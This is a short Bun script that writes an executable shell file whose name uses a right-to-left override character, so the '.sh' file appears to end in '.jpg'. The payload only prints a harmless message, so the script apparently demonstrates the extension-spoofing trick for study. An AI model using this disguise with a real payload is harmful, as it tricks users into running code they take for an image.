import { $ } from "bun";
const fileName = "solution_mat\u202Egpj.sh";
const payload = `#!/usr/bin/env bash
echo "Oh no, I was able to execute any code I want"
echo
read -p "Press any key to exit..." -n1 -s
`;

await Bun.write(fileName, payload);
await $`chmod +x ${fileName}`;

export {};
